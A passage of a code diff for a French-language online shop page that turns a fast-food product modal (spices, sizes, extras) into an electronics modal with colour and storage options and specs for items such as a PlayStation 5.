-        spices: ["Douce", "Épicée", "Volcanique", "Barbecue"],
-        sizes: ["XXL"],
-        extras: ["Frites incluses", "Toutes sauces", "Double viande"],
+        colors: ["#2c3e50", "#e8e8e8", "#b76e79", "#87ceeb"],
+        storage: [],
         specs: [
-          "Bœuf, poulet, viande hachée",
-          "Double fromage",
-          "Toutes les sauces",
-          "Frites à l'intérieur",
-          "Pain géant",
-          "Parfait pour 2 personnes"
+          "Réduction active du bruit",
+          "Son haute fidélité",
+          "Audio spatial avec suivi dynamique",
+          "Tige numérique pour contrôle",
+          "Jusqu'à 20h d'autonomie",
+          "Design luxueux en acier inoxydable"
+        ]
+      },
+      ps5: {
+        title: "PlayStation 5",
+        price: "400 $",
+        description: "La console next-gen de Sony. Ray tracing, SSD ultra-rapide, manette DualSense immersive.",
+        mainImage: "https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$",
+        thumbnails: [
+          "https://gmedia.playstation.com/is/image/SIEPDC/ps5-product-thumbnail-01-en-14sep21?$facebook$",
+          "https://gmedia.playstation.com/is/image/SIEPDC/ps5-console-image-block-02-en-24jul20?$1600px$",
+          "https://gmedia.playstation.com/is/image/SIEPDC/ps5-dualsense-image-block-01-en-24jul20?$1600px$"
+        ],
+        rating: 5,
+        reviews: 312,
+        colors: ["#ffffff", "#2c3e50"],
+        storage: ["825 Go"],
+        specs: [
+          "CPU AMD Zen 2 8 coeurs",
+          "GPU RDNA 2 10,3 TFLOPS",
+          "SSD ultra-rapide 825 Go",
+          "Ray tracing matériel",
+          "Manette DualSense haptique",
+          "Sortie HDMI 2.1, 4K à 120Hz"
         ]
       }
     };
-
-    // Ouvrir la modale avec les détails du produit
+    
     function openProductModal(productId) {
       const product = productsData[productId];
       if (!product) return;
       
       document.getElementById('modalProductTitle').textContent = product.title;
       
-      // Miniatures
       let thumbnailsHtml = '';
       product.thumbnails.forEach((thumb, index) => {
         thumbnailsHtml += `<div class="thumbnail ${index === 0 ? 'active' : ''}" onclick="changeMainImage(this, '${thumb}')"><img src="${thumb}" alt="thumbnail"></div>`;
       });
       
-      // Options d'épices
-      let spicesHtml = '';
-      if (product.spices) {
-        spicesHtml = '<div class="option-group"><h4>🌶️ Niveau d\'épices</h4><div class="spice-options">';
-        product.spices.forEach((spice, idx) => {
-          spicesHtml += `<div class="spice-btn ${idx === 0 ? 'selected' : ''}" onclick="selectSpice(this, '${spice}')">${spice}</div>`;
+      let colorOptionsHtml = '';
+      if (product.colors && product.colors.length > 0) {
+        colorOptionsHtml = '<div class="option-group"><h4>Couleurs disponibles</h4><div class="color-options">';
+        product.colors.forEach((color, idx) => {
+          colorOptionsHtml += `<div class="color-dot ${idx === 0 ? 'selected' : ''}" style="background-color: ${color};" onclick="selectColor(this, '${color}')"></div>`;
         });
-        spicesHtml += '</div></div>';
+        colorOptionsHtml += '</div></div>';
       }
       
-      // Options de taille
-      let sizesHtml = '';
-      if (product.sizes) {
-        sizesHtml = '<div class="option-group"><h4>📏 Taille</h4><div class="size-options">';
-        product.sizes.forEach((size, idx) => {
-          sizesHtml += `<div class="size-btn ${idx === 0 ? 'selected' : ''}" onclick="selectSize(this, '${size}')">${size}</div>`;
+      let storageOptionsHtml = '';
+      if (product.storage && product.storage.length > 0) {
+        storageOptionsHtml = '<div class="option-group"><h4>Capacité de stockage</h4><div class="storage-options">';
+        product.storage.forEach((storage, idx) => {
+          storageOptionsHtml += `<div class="storage-btn ${idx === 0 ? 'selected' : ''}" onclick="selectStorage(this, '${storage}')">${storage}</div>`;
         });
-        sizesHtml += '</div></div>';
+        storageOptionsHtml += '</div></div>';
       }
       
-      // Extras
-      let extrasHtml = '';
-      if (product.extras) {
-        extrasHtml = '<div class="option-group"><h4>➕ Suppléments</h4><div class="extras-options">';
-        product.extras.forEach((extra, idx) => {
-          extrasHtml += `<div class="extra-btn" onclick="toggleExtra(this, '${extra}')">${extra}</div>`;
-        });
-        extrasHtml += '</div></div>';
-      }
-      
-      // Caractéristiques
       let specsHtml = '';
-      if (product.specs) {
-        specsHtml = '<div class="product-specs"><h4>📋 Composition</h4><ul class="specs-list">';
+      if (product.specs && product.specs.length > 0) {
+        specsHtml = '<div class="product-specs"><h4>Caractéristiques techniques</h4><ul class="specs-list">';
         product.specs.forEach(spec => {
           specsHtml += `<li><i class="fas fa-check-circle"></i> ${spec}</li>`;
         });
@@ -1322,24 +1191,23 @@ document.getElementById('enterBtn').addEventListener('click', function() {
             </div>
             
             <div class="product-options">
-              ${spicesHtml}
-              ${sizesHtml}
-              ${extrasHtml}
+              ${colorOptionsHtml}
+              ${storageOptionsHtml}
             </div>
             
             ${specsHtml}
             
             <div class="warranty-badge">
-              <i class="fas fa-motorcycle"></i>
-              <span>Livraison gratuite dès 25.000 FC</span>
-              <i class="fas fa-clock"></i>
-              <span>Préparation 15-20 min</span>
+              <i class="fas fa-shield-alt"></i>
+              <span>Garantie constructeur 2 ans incluse</span>
+              <i class="fas fa-truck"></i>
+              <span>Livraison gratuite en RDC</span>
             </div>
             
             <button class="btn-add-cart" onclick="addToCart('${productId}')">
-              <i class="fas fa-shopping-cart"></i> AJOUTER À LA COMMANDE
+              <i class="fas fa-shopping-cart"></i> AJOUTER AU PANIER
             </button>
-            <p style="font-size: 13px; color: #fde68a; margin-top: 15px; text-align: center;">
+            <p style="font-size: 12px; color: #a0afc0; margin-top: 10px; text-align: center;">
               <i class="fas fa-mobile-alt"></i> Paiement Mobile Money accepté
             </p>
           </div>
@@ -1349,13 +1217,11 @@ document.getElementById('enterBtn').addEventListener('click', function() {
       document.getElementById('modalBodyContent').innerHTML = modalContent;
       document.getElementById('productModal').style.display = 'flex';
     }
-
-    // Fermer la modale
+    
     function closeModal() {
       document.getElementById('productModal').style.display = 'none';
     }
-
-    // Changer l'image principale
+    
     function changeMainImage(element, imageUrl) {
       document.getElementById('mainProductImage').src = imageUrl;
       document.querySelectorAll('.thumbnail').forEach(thumb => {
@@ -1363,35 +1229,26 @@ document.getElementById('enterBtn').addEventListener('click', function() {
       });
       element.classList.add('active');
     }
-
-    // Sélectionner épice
-    function selectSpice(element, spice) {
-      document.querySelectorAll('.spice-btn').forEach(btn => {
+    
+    function selectColor(element, color) {
+      document.querySelectorAll('.color-dot').forEach(dot => {
+        dot.classList.remove('selected');
+      });
+      element.classList.add('selected');
+    }
+    
+    function selectStorage(element, storage) {
+      document.querySelectorAll('.storage-btn').forEach(btn => {
         btn.classList.remove('selected');
       });
       element.classList.add('selected');
     }
-
-    // Sélectionner taille
-    function selectSize(element, size) {
-      document.querySelectorAll('.size-btn').forEach(btn => {
-        btn.classList.remove('selected');
-      });
-      element.classList.add('selected');
-    }
-
-    // Toggle extra (sélection multiple)
-    function toggleExtra(element, extra) {
-      element.classList.toggle('selected');
-    }
-
-    // Ajouter au panier
+    
     function addToCart(productId) {
-      alert('✅ Produit ajouté à votre commande !');
+      alert('Produit ajouté au panier !');
       closeModal();
     }
-
-    // Fermer modale en cliquant sur l'overlay
+    
     window.onclick = function(event) {
       const modal = document.getElementById('productModal');
       if (event.target === modal) {
